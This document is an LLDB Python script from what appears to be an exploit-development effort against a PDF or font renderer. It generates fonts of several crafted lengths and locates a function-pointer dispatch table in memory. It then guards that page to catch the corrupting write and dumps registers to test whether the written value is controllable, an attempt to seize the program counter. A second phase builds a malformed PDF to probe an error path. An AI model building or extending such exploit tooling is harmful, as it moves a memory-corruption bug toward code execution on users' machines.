# RIP-24: DISPATCH-TABLE STRIKE — the PC-control attempt.
# A: in-job scan for the arena fn-ptr table (densest code-ptr run near x27),
#    guard its page, sweep L: SIGSEGV with fa on table page = STRIKE. Dump the
#    store instruction's value-reg at the strike (value controllability).
# B: error-path dp recon with pc guards.
import os, sys, struct, time
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
TRACE = open(os.path.join(CWD, "rip24_trace.txt"), "a")
def T(s): print(s, flush=True); TRACE.write(s+"\n"); TRACE.flush()
err = lldb.SBError()

def qwords(p, addr, n):
    if addr < 0x100000: return None
    m = p.ReadMemory(addr, n*8, err)
    if not err.Success() or not m: return None
    return [struct.unpack('<Q', m[i*8:i*8+8])[0] for i in range(n)]

def fresh():
    old = t.GetProcess()
    if old and old.IsValid() and old.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
        old.Kill(); time.sleep(0.2)

def wait_stop(p, budget=25):
    p.Continue()
    st = p.GetState()
    t0 = time.time()
    while st == lldb.eStateRunning:
        if time.time() - t0 > budget:
            try: p.Stop(); time.sleep(0.5); st = p.GetState()
            except Exception: pass
            if st == lldb.eStateRunning:
                try: p.Kill()
                except Exception: pass
                return lldb.eStateKilled
            return st
        time.sleep(0.1); st = p.GetState()
    return st

def killp(p):
    try:
        if p and p.IsValid() and p.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
            p.Kill()
    except Exception: pass

def safe_pc_addr(fr):
    try:
        a = fr.GetPCAddress().GetLoadAddress(t)
        if a is None or a < 0 or a >= (1 << 48): return None
        return a
    except Exception: return None

def find_table_page(p, x27):
    # scan x27-0x9000 .. x27+0x6000 for densest run of code-ish qwords (>=6 in 32)
    best = None; bestn = 0
    for base in range(x27 - 0x9000, x27 + 0x6000, 0x1000):
        qs = qwords(p, base, 0x1000//8)
        if not qs: continue
        n = sum(1 for q in qs if 0x100000000 <= q < 0x800000000 and (q & 3) == 0)
        if n > bestn:
            bestn = n; best = base
    if best and bestn >= 10:
        return best, bestn
    return None, bestn

# ---- PHASE-A: table strike sweep ----
import subprocess
res_by_L = {}
for L in [28032, 28544, 28944, 29840, 30480, 30864, 30992, 31472, 31664, 31792, 32048, 32304]:
    f = "k2_e%d.ttf" % L
    if not os.path.exists("k2_e%d.pdf" % L):
        r = subprocess.run(['./venv/bin/python','-c',
            "import sys; sys.path.insert(0,'.'); from gen_k2 import build_font; build_font('%s', %d)" % (f, L)], capture_output=True)
        if r.returncode != 0:
            T("L=%d fontfail" % L); continue
        subprocess.run(['./venv/bin/python','gen_pdf.py',"k2_e%d.pdf" % L, f], capture_output=True)
    fresh()
    be = t.BreakpointCreateByName("aa_cache_render"); be.SetOneShot(True)
    pdf = "k2_e%d.pdf" % L
    p = t.LaunchSimple([pdf, "r.png"], None, CWD)
    if not p or not p.IsValid():
        T("L=%d launchfail" % L); continue
    th = p.GetSelectedThread()
    pc0 = safe_pc_addr(th.GetSelectedFrame())
    if not pc0:
        T("L=%d noentry-pc" % L); killp(p); continue
    bw = t.BreakpointCreateByAddress(pc0 + 1804)
    x27 = 0; wh = 0; strike = None
    for i in range(40):
        st = wait_stop(p)
        if st != lldb.eStateStopped: break
        fr = p.GetSelectedThread().GetSelectedFrame()
        off = -1
        try:
            if fr.GetSymbol():
                a = safe_pc_addr(fr)
                if a: off = a - fr.GetSymbol().GetStartAddress().GetLoadAddress(t)
        except Exception: pass
        if off == 1804:
            wh += 1
            x27 = fr.FindRegister("x27").GetValueAsUnsigned()
            if wh == 2:
                tp, n = find_table_page(p, x27)
                if not tp:
                    T("L=%d no-table(n=%d)" % (L, n)); break
                v = t.EvaluateExpression('(int)mprotect((void*)%d, 4096, 1)' % tp)
                T("L=%d guard table-page=%x (codeptrs=%d) mprot=%d" % (L, tp, n, v.GetValueAsSigned()))
                t.BreakpointDelete(bw.GetID())  # let it run wild
            p.Continue()
        else:
            desc = p.GetSelectedThread().GetStopDescription(300) or ""
            fa = 0
            if "address=" in desc:
                try: fa = int(desc.split("address=")[1].split(")")[0], 16)
                except Exception: pass
            a = safe_pc_addr(fr)
            symoff = -1
            try:
                if fr.GetSymbol() and a: symoff = a - fr.GetSymbol().GetStartAddress().GetLoadAddress(t)
            except Exception: pass
            T("L=%d STOP site+%d fa=%x %s" % (L, symoff, fa, desc[:70]))
            # dump regs: find the stored value (candidate regs x0-x17 non-addr-ish)
            regs = {}
            for r in ("x0","x1","x2","x3","x4","x5","x6","x7","x9","x10","x11","x12","x13","x14","x15"):
                vv = fr.FindRegister(r)
                if vv and vv.IsValid():
                    q = vv.GetValueAsUnsigned()
                    if q: regs[r] = q
            T("L=%d strike-regs: %s" % (L, {k: hex(v) for k, v in regs.items()}))
            strike = (symoff, fa)
            killp(p); break
    if strike:
        res_by_L[L] = strike
    else:
        T("L=%d rc=%s (no strike)" % (L, p.GetExitStatus() if p.IsValid() else -1))
        killp(p)
    for b in (be, bw):
        if b: t.BreakpointDelete(b.GetID())
T("A strikes: %s" % res_by_L)

# ---- PHASE-B: error-path dp recon (pc-guarded) ----
src = os.path.join(CWD, "k2_d31472.pdf")
dst = os.path.join(CWD, "k2_bad.pdf")
data = bytearray(open(src, "rb").read())
idx = data.find(b'Tj')
if idx > 0: data[idx-6:idx] = b'\xff\xff\xff\xff\xff\xff'
open(dst, "wb").write(bytes(data))
T("B built k2_bad.pdf")
fresh()
bf = t.BreakpointCreateByName("data_release_info")
p = t.LaunchSimple(["k2_bad.pdf", "r.png"], None, CWD)
if p and p.IsValid():
    got = False
    for i in range(60):
        st = wait_stop(p)
        if st != lldb.eStateStopped:
            T("B ended st=%s rc=%s" % (st, p.GetExitStatus() if p.IsValid() else -1)); break
        fr = p.GetSelectedThread().GetSelectedFrame()
        nm = "?"
        try: nm = fr.GetSymbol().GetName() or "?"
        except Exception: pass
        if "data_release_info" in nm:
            x0 = fr.FindRegister("x0").GetValueAsUnsigned()
            x8 = 0
            r8 = fr.FindRegister("x8")
            if r8 and r8.IsValid(): x8 = r8.GetValueAsUnsigned()
            T("B FIN x0=%x x8=%x" % (x0, x8))
            obj = qwords(p, x0, 0x130//8)
            T("B obj: %s" % ([hex(q) for q in obj] if obj else None))
            if obj:
                mut = [(j*8) for j, q in enumerate(obj) if (q & 0xFFFFFFFF) == 0x4d555458]
                T("B MUTEX at obj+%s" % mut)
                l1 = [(j*8) for j, q in enumerate(obj) if q == x8]
                T("B x8 direct: %s" % l1)
                if not l1:
                    for j, q in enumerate(obj):
                        if 0x100000000 <= q < 0x800000000000 and (q & 7) == 0:
                            sub = qwords(p, q, 0x30)
                            if sub:
                                l2 = [k*8 for k, s in enumerate(sub) if s == x8]
                                if l2: T("B x8 = *(x0+%x)+%x" % (j*8, l2[0]))
            got = True
            killp(p); break
        p.Continue()
    if not got: T("B fin never hit")
killp(p)
t.BreakpointDelete(bf.GetID())
T("RIP-24 DONE")
TRACE.close()
